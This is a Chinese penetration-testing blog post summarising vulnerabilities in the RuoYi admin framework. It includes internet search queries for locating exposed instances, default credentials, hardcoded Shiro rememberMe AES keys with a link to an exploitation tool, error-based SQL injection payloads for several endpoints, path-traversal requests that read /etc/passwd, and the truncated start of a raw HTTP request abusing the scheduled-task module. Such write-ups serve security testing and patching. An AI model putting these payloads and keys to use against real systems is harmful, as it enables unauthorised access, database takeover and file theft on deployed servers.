---
title: 若依(RuoYi)框架漏洞总结 - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/18896463
source: 博客园 - 渗透测试中心
date: 2025-05-27
fetch_date: 2025-10-06T22:30:15.861827
---

# 若依(RuoYi)框架漏洞总结 - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [若依(RuoYi)框架漏洞总结](https://www.cnblogs.com/backlion/p/18896463 "发布于 2025-05-26 10:25")

0x00 前言

当你在用若依时，黑客已经在用Shiro默认密钥弹你的Shell；当你还在纠结分页查询，攻击者已通过SQL注入接管数据库；而你以为安全的定时任务，不过是他们拿捏服务器的玩具。这份手册，带你用渗透的视角，解剖若依的每一处致命弱点——因为真正的安全，始于知晓如何毁灭它。

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102248013-1076452866.png)

## 简介

Ruoyi（若依）是一款基于Spring Boot和Vue.js开发的快速开发平台。它提供了许多常见的后台管理系统所需的功能和组件，包括权限管理、定时任务、代码生成、日志管理等。Ruoyi的目标是帮助开发者快速搭建后台管理系统，提高开发效率。

若依有很多版本，其中使用最多的是Ruoyi单应用版本（RuoYi），Ruoyi前后端分离版本（RuoYi-Vue），Ruoyi微服务版本（RuoYi-Cloud），Ruoyi移动版本（RuoYi-App）。

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102248903-1947366430.png)

## **配合ruoyi的服务：**

```
alibaba druid
alibaba nacos
spring
redis
mysql
minio
fastjson
shiro
swagger-ui.html
mybatis
```

## 搜索语法

FOFA：

```
(icon_hash="-1231872293" || icon_hash="706913071")
```

Hunter：

```
web.body="若依后台管理系统"
```

## 环境搭建

新建文件夹，拉起ruoyi源码

```
git clone https://gitee.com/y_project/RuoYi
```

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102250070-1085838405.png)

```
cd RuoYi
切换版本
git tag -l
切换
git checkout v4.5.1
```

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102251698-1877018308.png)
接下来用idea搭建的
mysql正常用phpstudy搭建就行
日志存放路径需要修改

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102253376-384003877.png)

配置mysql

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102255482-478702375.png)

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102257874-1239571052.png)
启动即可，默认端口80

## 0x01 弱口令

```
用户：admin ruoyi druid
密码：123456 admin druid admin123 admin888
```

## 0x02 Shiro默认密钥

## 漏洞简介

若依默认使用shiro组件，所以可以试试shiro经典的rememberMe漏洞来getshell。

## 影响版本

RuoYi<V-4.6.2

## 漏洞复现

在配置文件中，能够看到shiro的密钥是在配置文件中的

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102300068-2071940337.png)

漏洞利用工具地址
<https://github.com/SummerSec/ShiroAttack2>

* RuoYi-4.2版本使用的是shiro-1.4.2在该版本和该版本之后都需要勾选AES GCM模式。

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102301778-1151142825.png)

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102303322-1135124765.png)

| RuoYi 版本号 | 对象版本的默认AES密钥 |
| --- | --- |
| 4.6.1-4.3.1 | zSyK5Kp6PZAAjlT+eeNMlg== |
| 3.4-及以下 | fCq+/xW488hMTCD+cmJ3aQ== |

* RuoYi-4.6.2版本开始就使用随机密钥的方式，而不使用固定密钥，若要使用固定密钥需要开发者自己指定密钥，因此4.6.2版本以后,在没有获取到密钥的请情况下无法再进行利用。

## 0x03 SQL注入

### 注入点1 /role/list接口 （<V-4.6.2）

版本同上4.5.1
首先从源码分析一波
Mybatis配置一般用#{}，类似PreparedStatement的占位符效果，可以防止SQL注入。RuoYi则是采用了${}造成了SQL注入

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102305193-155726732.png)
跳转

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102308091-1423206447.png)
解释一下 ${params.dataScope}

`${params.dataScope}`这段代码是MyBatis的动态SQL之一，主要用于在SQL查询中嵌入外部定义的字符串或参数。这里的`${...}`语法表示取出`params`对象中名为`dataScope`的属性值，并将其直接嵌入到SQL语句中。

`例如，在一个基于角色权限管理的系统中，不同的用户可能有权限查看不同的数据记录。管理员可能可以查看所有部门的记录，而普通用户只能查看自己部门的记录。在这种情况下，`dataScope`的值可以是一个根据用户角色动态生成的SQL片段，如`"AND dept\_id IN (SELECT dept\_id FROM user\_dept\_access WHERE user\_id = #{userId})"`，用以限定查询结果只包含特定部门的用户信息。`

可以看到，在查询的时候，user的属性params是map，在xml中，将dataScope拼接到sql语句后

进入mapper层

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102310097-145350624.png)

跳转到上级

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102312147-2036815623.png)
进入role查看信息

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102313775-578705605.png)
查看功能

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102315346-935985891.png)
params

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102317197-1586896472.png)

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102319203-971347451.png)

根据路径

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102321704-1004049523.png)
执行代码

```
&params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))
```

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102323907-481689349.png)

### 注入点2 /role/export （<V-4.6.2）

### 注入点3 /user/list （<V-4.6.2）

### 注入点4 /user/list （<V-4.6.2）

### 注入点5 /dept/list （<V-4.6.2）

### 注入点6 /role/authUser/allocatedList （<V-4.6.2）

### 注入点7 /role/authUser/unallocatedList

### 注入点8 /dept/edit （<V-4.6.2）

```
DeptName=xxxxxxxxxxx&DeptId=100&ParentId=555&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat(0,(select user()))));#
```

### 注入点9 /tool/gen/createTable（V-4.7.1-V-4.7.5）

参考
<https://blog.takake.com/posts/7219/#2-3-10-%E6%80%BB%E7%BB%93>

## 0x04 CNVD-2021-01931任意文件下载

#### 漏洞简介

登录后台后可以读取服务器上的任意文件。

#### 影响版本：

RuoYi<4.5.1

#### 漏洞复现

用4.5.0版本
直接搜索关键字，download找到具体的controller
路径

```
/common/download/resource
```

```
/common/download/resource?resource=/profile/../../../../etc/passwd
/common/download/resource?resource=/profile/../../../../Windows/win.ini
```

![image.png](https://img2023.cnblogs.com/blog/1049983/202505/1049983-20250526102326290-402836344.png)

## 0x05 CVE-2023-27025 若依任意文件下载

## 漏洞简介

该漏洞是若依（RuoYi）4.7.6 版本中存在的 **权限绕过 + 任意文件下载** 组合漏洞。攻击者通过后台管理接口添加恶意定时任务，修改系统配置文件路径，绕过下载功能的白名单限制，最终实现任意文件下载。漏洞本质是 **权限控制缺失**（允许低权限用户操作敏感接口）和 **路径校验不严**（未对动态修改的配置路径进行二次校验）的综合结果。

## 影响版本

* **若依（RuoYi）<= 4.7.6**

## 利用条件

1. **权限要求**：
   * 攻击者需获取管理员 Cookie（如 `JSESSIONID`）或存在其他权限绕过漏洞。
   * 若后台接口未授权即可访问，则漏洞危害升级为“未授权任意文件下载”。
2. **系统配置**：
   * 目标系统启用了定时任务模块（默认开启）。

## 漏洞复现

#### 添加任务绕过白名单（自定义下载文件路径）

```
POST /monitor/job/add HTTP/1.1
Host: 10.40.107.67
Cookie: _tea_utm_cache_10000007=undefined; java-chains-token-key=admin_token; JSESSIONID=7c625b5d-cd39-49fd-87db-bbb64c596c1b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
Content-Length: 214
Connection: close

createBy=admin&jobId=161&jobName=test111&jobGroup=DEFA...